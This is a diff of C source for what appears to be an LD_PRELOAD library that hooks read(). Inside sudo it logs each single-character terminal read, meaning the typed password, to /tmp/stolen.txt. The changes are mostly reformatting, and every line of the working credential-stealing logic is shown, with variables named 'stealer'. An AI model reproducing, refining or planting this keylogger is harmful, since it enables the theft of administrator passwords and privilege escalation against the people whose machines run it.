@@ -34,13 +34,12 @@
 #define MAX_PROCESS_NAME_LEN 256
 
 //pointer to real read func (needs to be PIC)
-static ssize_t (*original_read) (int fd, void *buf, size_t count) = NULL;
+static ssize_t(*original_read) (int fd, void *buf, size_t count) = NULL;
 
 // get file size in a robust way
-long long
-getfsize (const char *fn) {
+long long getfsize(const char *fn) {
   struct stat st;
-  if(stat (fn, &st) != 0) {
+  if(stat(fn, &st) != 0) {
     return -1;
   }
   off_t fs = st.st_size;
@@ -49,33 +48,35 @@ getfsize (const char *fn) {
 
 int amsudo() {
   char process_name[MAX_PROCESS_NAME_LEN] = { 0 };
-  FILE *fp_comm = fopen ("/proc/self/comm", "r");
-    fgets (process_name, sizeof (process_name), fp_comm);
-    process_name[strcspn (process_name, "\n")] = '\0';
-    fclose(fp_comm);
-    return strcmp(process_name, "sudo");
+  FILE *fp_comm = fopen("/proc/self/comm", "r");
+  fgets(process_name, sizeof(process_name), fp_comm);
+  process_name[strcspn(process_name, "\n")] = '\0';
+  fclose(fp_comm);
+  return strcmp(process_name, "sudo");
 }
- 
-ssize_t
-read (int fd, void *buf, size_t count) {
+
+ssize_t read(int fd, void *buf, size_t count) {
   if(original_read == NULL) {
-    original_read = dlsym (RTLD_NEXT, "read");
+    original_read = dlsym(RTLD_NEXT, "read");
     if(original_read == NULL) {
       return -1;
     }
   }
   // check if the current process is sudo
-      if(amsudo() == 0) {
-      if(getfsize ("/tmp/stolen.txt") >= MAX_FILE_SIZE) {
-	return original_read (fd, buf, count);
-      }
-      FILE *stealer = fopen ("/tmp/stolen.txt", "a");
-      // this helps us isolate the characters from term only
-      if(count == 1) {
-	// we need to cast buf
-	fprintf (stealer, "%.1s", (char *)buf);
-      }
-      fclose (stealer);
+  if(amsudo() == 0) {
+    const char stealfile[] = "/tmp/stolen.txt";
+    // make sure our file isn't overgrown
+    if(getfsize(stealfile) >= MAX_FILE_SIZE) {
+      return original_read(fd, buf, count);
     }
+    // this helps us isolate the characters from term
+    // only (artifact of sudo src)
+    if(count == 1) {
+      FILE *stealer = fopen(stealfile, "a");
+      // we need to cast buf
+      fprintf(stealer, "%.1s", (char *)buf);
+      fclose(stealer);
+    }
+  }
   return original_read(fd, buf, count);
 }
